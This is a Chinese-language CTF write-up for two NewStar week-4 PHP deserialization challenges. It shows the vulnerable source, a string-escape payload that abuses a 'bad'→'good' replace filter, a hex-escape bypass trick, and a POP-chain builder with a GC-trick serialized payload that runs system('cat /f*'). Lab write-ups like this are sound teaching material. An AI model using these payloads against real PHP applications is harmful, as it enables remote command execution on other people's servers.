## 前言

```java
Newstar第四周最后一周，赶紧润来看看题
```

## 逃

```java
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key'])))); 
```

```java
字符的变化 少->多肯定是字符串逃逸，但是我的脑瓜子做这种题就很蒙
O:7:"GetFlag":2:{s:3:"key";s:81:"27个good";s:3:"cmd";s:7:"cat /f*";}    
其实少->多就是覆盖全部的字符
   
```

O:7:"GetFlag":2:{s:3:"key";s:105:"`badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:7:"cat /f*";}`";s:3:"cmd";s:6:"whoami";}

红色包围的是105个字符，但是waf后就会变为

O:7:"GetFlag":2:{s:3:"key";s:105:"`27个 good`";s:3:"cmd";s:7:"cat /f*";}   `后面到了前面的}就会结束`";s:3:"cmd";s:6:"whoami";}

大致就是这样，所以只用算出 ";s:3:"cmd";s:7:"cat /f*";} 即可有多少个，就有多少个bad

##### 然后发现发现一个`trick`

```java
{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}  其中S必须大写才会存在16进制,flag.php，可以用16进制绕过
```

```jav
key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad%22;s:3:%22cmd%22;s:7:%22cat%20/f*%22;}
```

## More Fast

```java
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55
```

呃呃呃一眼GC回收机制，

 ($this->func)($this->var);  这里直接取反发现没成功。。。。qaq

直接system就可以，呃呃呃本地一直括号报错，耽误时间了。。。

![image-20231023135759520](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231023135759520.png)

```java
$S=new Start();
$S->errMsg=new Crypto();

$S->errMsg->obj=new Reverse();
$S->errMsg->obj->func=new Pwn();
$S->errMsg->obj->func->obj=new Web();
$S->errMsg->obj->func->obj->func="system";

$S->errMsg->obj->func->obj->var="cat /f*";

$a=array(0=>$S,1=>3);

//a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:19:"~%8C%86%8C%8B%9A%92";s:3:"var";s:7:"~%93%8C";}}}}}i:0;i:3;}
echo serialize($a);
```

